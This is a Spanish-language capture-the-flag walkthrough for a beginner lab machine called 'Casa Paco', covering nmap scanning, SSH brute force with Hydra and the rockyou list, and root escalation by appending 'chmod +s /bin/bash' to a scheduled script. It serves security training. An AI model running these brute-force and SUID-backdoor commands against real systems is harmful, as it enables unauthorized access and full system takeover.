---
description: '🔍 Dificultad: Principiante'
---

# Casa Paco

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.60
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1024).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.60 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH y** el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.60
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1026).png" alt=""><figcaption></figcaption></figure>

Miramos a ver que contiene el puerto 80 por si encontramos alguna información relevante pero hay que añadir el dominio **casapaco.thl**.

<figure><img src="../../.gitbook/assets/image (1027).png" alt=""><figcaption></figcaption></figure>

Revisando la página encontramos esto interesante.

<figure><img src="../../.gitbook/assets/image (1029).png" alt=""><figcaption></figcaption></figure>

Interceptamos con **Burpsuite** peticiones.

<figure><img src="../../.gitbook/assets/image (1030).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Dado que hemos identificado otra página, **/llevar1.php**, intentaremos ejecutar comandos en ella para determinar si proporciona más información que la página anterior.

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

Descubrimos el usuario pacogerente por lo que realizamos fuerza bruta con Hydra.

```bash
hydra -l pacogerente -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.60 
```

Iniciamos sesión con esas credenciales.

<figure><img src="../../.gitbook/assets/image (1032).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos SUDO.&#x20;

Tenemos un archivo que se está ejecutando por lo que cambiamos el contenido para poder manipular y ser root.

```bash
echo 'chmod +s /bin/bash' >> /home/pacogerente/fabada.sh
/bin/bash -p
```

<figure><img src="../../.gitbook/assets/image (1033).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.&#x20;

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
